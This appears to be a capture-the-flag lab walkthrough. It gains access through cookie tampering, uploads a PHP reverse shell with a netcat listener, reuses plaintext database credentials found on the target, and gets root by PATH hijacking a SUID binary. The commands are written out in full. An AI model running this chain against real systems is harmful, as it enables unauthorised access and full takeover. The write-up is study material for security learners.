## 1. Reconnaissance

Nmap scan:
nmap -sV -sC -p- <IP>
Open ports:

22 (SSH) — OpenSSH 8.0

80 (HTTP) — Apache httpd 2.4.41

The web server hosts an automotive-themed site.

2. Enumeration
Map the site using Burp Suite:

Configure your browser to use the proxy at 127.0.0.1:8080.

Disable interception (Proxy → Intercept → Intercept is off).

Refresh the site and navigate to Target → Site map.

A hidden directory was discovered: /cdn-cgi/login.

Accessing this path reveals a login page. Standard passwords did not work, but there was a "Login as Guest" button.

3. Exploitation (Broken Access Control)
As a guest, access was restricted to specific pages. Using the browser's developer tools (Storage → Cookies), we identified the cookie values.

We navigated to the guest account profile and modified the cookie, as well as the `id` parameter in the URL:

http://<IP>/cdn-cgi/login/admin.php?content=accounts&id=1
This allowed for user enumeration and privilege escalation.

We modified the cookies to:

role=admin

user=34322

This granted access to an upload page.

4. Gaining Access (Reverse Shell)
Having gained access to the upload form, the next objective was to obtain a shell on the target system. Used a pre-existing PHP reverse shell:

/usr/share/webshells/php/php-reverse-shell.php
NOTE: Before uploading, modify the PHP reverse shell:

Change the IP to your own machine's IP.

Change the port to your listening port (e.g., 6000).

Listener:

rlwrap nc -lvnp 6000
Identifying the upload directory:
/uploads — a logical guess, but we confirmed it using Gobuster:

gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
Gobuster revealed /uploads.

Launching the reverse shell:
Open the uploaded PHP file in your browser:

http://<IP>/uploads/php-reverse-shell.php
Upgrading the shell:

python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo;fg
# Press Enter twice

5. Lateral Movement (Robert's Account)
While exploring the web directories, we navigated to:

/var/www/html/cdn-cgi/login
Upon examining the db.php file, we discovered sensitive database credentials:

Username: robert

Password: M3g4C0rpUs3r!

Switched to the user 'robert':

su ​​robert
# Enter password: M3g4C0rpUs3r!

6. Privilege Escalation
Check the groups for 'robert':

id
We observed that 'robert' is a member of the 'bugtracker' group. Find SUID binaries:

find / -perm -u=s -type f 2>/dev/null
Found /usr/bin/bugtracker with the SUID bit set.

Exploiting bugtracker (PATH Hijacking):
The bugtracker binary executes `cat` without specifying the full path, making it vulnerable to PATH hijacking.

Navigate to /tmp and create a malicious script named `cat`:

echo -e '#!/bin/bash\n/bin/sh' > /tmp/cat
chmod +x /tmp/cat
Update the PATH:

export PATH=/tmp:$PATH
Run the vulnerable binary:

/usr/bin/bugtracker somefile
This executes our malicious `cat` script, granting us a root shell.

8. Conclusions
Broken Access Control via cookie manipulation.

Sensitive credentials found in web configuration files (db.php).

Exploitation of an SUID binary via PATH hijacking.

Always inspect cookies and Base64-encoded data.
